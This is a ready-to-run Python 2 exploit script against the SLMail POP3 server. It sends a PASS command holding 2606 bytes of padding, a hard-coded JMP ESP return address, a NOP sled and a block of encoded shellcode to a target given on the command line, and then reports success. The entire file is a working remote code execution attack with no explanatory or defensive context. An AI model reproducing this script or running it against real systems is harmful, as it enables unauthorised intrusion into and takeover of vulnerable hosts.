#!/usr/bin/python 

import time, sys, struct
import socket as so

chars='A'*2606

#jmpesp ADDR 5F4A358F

jmpesp="\x8f\x35\x4a\x5f"

nops='\x90'*16

buf =  ""
buf += "\xdb\xda\xbe\x2d\x36\x12\xe4\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\xc5\xca\xf0"
buf += "\x11\xe9\xdb\x77\xd9\x11\x1c\x18\x53\xf4\x2d\x18\x07"
buf += "\x7d\x1d\xa8\x43\xd3\x92\x43\x01\xc7\x21\x21\x8e\xe8"
buf += "\x82\x8c\xe8\xc7\x13\xbc\xc9\x46\x90\xbf\x1d\xa8\xa9"
buf += "\x0f\x50\xa9\xee\x72\x99\xfb\xa7\xf9\x0c\xeb\xcc\xb4"
buf += "\x8c\x80\x9f\x59\x95\x75\x57\x5b\xb4\x28\xe3\x02\x16"
buf += "\xcb\x20\x3f\x1f\xd3\x25\x7a\xe9\x68\x9d\xf0\xe8\xb8"
buf += "\xef\xf9\x47\x85\xdf\x0b\x99\xc2\xd8\xf3\xec\x3a\x1b"
buf += "\x89\xf6\xf9\x61\x55\x72\x19\xc1\x1e\x24\xc5\xf3\xf3"
buf += "\xb3\x8e\xf8\xb8\xb0\xc8\x1c\x3e\x14\x63\x18\xcb\x9b"
buf += "\xa3\xa8\x8f\xbf\x67\xf0\x54\xa1\x3e\x5c\x3a\xde\x20"
buf += "\x3f\xe3\x7a\x2b\xd2\xf0\xf6\x76\xbb\x35\x3b\x88\x3b"
buf += "\x52\x4c\xfb\x09\xfd\xe6\x93\x21\x76\x21\x64\x45\xad"
buf += "\x95\xfa\xb8\x4e\xe6\xd3\x7e\x1a\xb6\x4b\x56\x23\x5d"
buf += "\x8b\x57\xf6\xf2\xdb\xf7\xa9\xb2\x8b\xb7\x19\x5b\xc1"
buf += "\x37\x45\x7b\xea\x9d\xee\x16\x11\x76\xd1\x4f\x21\xe3"
buf += "\xb9\x8d\x51\xea\x82\x1b\xb7\x86\xe4\x4d\x60\x3f\x9c"
buf += "\xd7\xfa\xde\x61\xc2\x87\xe1\xea\xe1\x78\xaf\x1a\x8f"
buf += "\x6a\x58\xeb\xda\xd0\xcf\xf4\xf0\x7c\x93\x67\x9f\x7c"
buf += "\xda\x9b\x08\x2b\x8b\x6a\x41\xb9\x21\xd4\xfb\xdf\xbb"
buf += "\x80\xc4\x5b\x60\x71\xca\x62\xe5\xcd\xe8\x74\x33\xcd"
buf += "\xb4\x20\xeb\x98\x62\x9e\x4d\x73\xc5\x48\x04\x28\x8f"
buf += "\x1c\xd1\x02\x10\x5a\xde\x4e\xe6\x82\x6f\x27\xbf\xbd"
buf += "\x40\xaf\x37\xc6\xbc\x4f\xb7\x1d\x05\x7f\xf2\x3f\x2c"
buf += "\xe8\x5b\xaa\x6c\x75\x5c\x01\xb2\x80\xdf\xa3\x4b\x77"
buf += "\xff\xc6\x4e\x33\x47\x3b\x23\x2c\x22\x3b\x90\x4d\x67"

exploit = chars + jmpesp + nops + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage: python %s <IP_ADDR> <PORT>" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to exploit Slmail sever at %s with Buffer Overflow"%sys.argv[1]
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER stormworm' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + exploit + '\r\n')
   print "[+] Exploited."
except:
   print "[+] Unable to connect to Slmail server at %s" %sys.argv[1]
   sys.exit()
